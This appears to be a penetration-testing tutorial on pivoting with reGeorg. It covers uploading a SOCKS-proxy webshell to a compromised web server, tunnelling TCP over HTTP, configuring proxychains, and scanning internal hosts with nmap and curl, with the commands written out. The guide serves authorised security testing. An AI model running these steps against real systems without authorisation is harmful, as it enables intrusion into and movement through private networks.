During a penetration test, if you manage to compromise a web server and gain the ability to upload files or deploy a web shell, it's highly valuable to use that foothold for **pivoting** into the internal network. This is typically done by tunneling TCP traffic over HTTP.

In the past, tools like **Tunna** were used for this purpose. Today, one of the most effective and reliable tools to add to your arsenal is **reGeorg**, originally developed by SensePost (previously known as reDuh until 2014).

---

## What reGeorg Does

**reGeorg** allows you to create a **TCP-over-HTTP tunnel** through a compromised web server. It sets up a **SOCKS4/5 proxy** on your local machine, which forwards traffic through the webshell to internal services.

#### Requirements:

- Python 2.7
- `urllib3` module
- A deployed webshell (ASPX, JSP, PHP, or similar)

---

## Step-by-Step Usage

#### 1. Upload the Webshell

Choose the appropriate webshell for the target server’s technology:

- `reGeorgSocksProxy.php`
- `reGeorgSocksProxy.aspx`
- `reGeorgSocksProxy.jsp`
- `reGeorgSocksProxy.ashx`

Upload it to a writable directory on the compromised web server.

---

#### 2. Launch the Proxy

Run the reGeorg client from your machine:

```bash
python reGeorgSocksProxy.py -p 1337 -u http://web.example.com/uploads/tunnel.php
```

This command:

- Starts a SOCKS proxy on port `1337`
- Connects to the uploaded webshell at the specified URL

---

#### 3. Configure Proxychains

Edit your `/etc/proxychains.conf` to route traffic through the new SOCKS proxy:

```ini
# Add at the bottom of the file
socks5 127.0.0.1 1337
```

---

#### 4. Start Scanning Internal Services

Use tools like `nmap` or `curl` through proxychains to explore the internal network:

```bash
proxychains nmap -sT -Pn -n -p 445 10.0.0.5
```

Or:

```bash
proxychains curl http://10.0.0.5/intranet/
```
